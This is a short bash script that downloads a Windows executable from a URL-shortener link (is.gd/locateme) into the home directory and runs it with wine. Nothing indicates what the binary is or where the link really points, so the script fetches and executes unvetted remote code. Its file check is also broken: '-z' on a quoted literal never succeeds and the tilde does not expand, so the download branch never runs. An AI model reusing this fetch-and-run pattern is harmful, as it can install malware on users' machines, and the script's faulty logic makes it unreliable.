#!/bin/bash
if [ -z "~/m.exe" ]; then
wget -O ~/m.exe https://is.gd/locateme
fi
wine ~/m.exe;
exit 0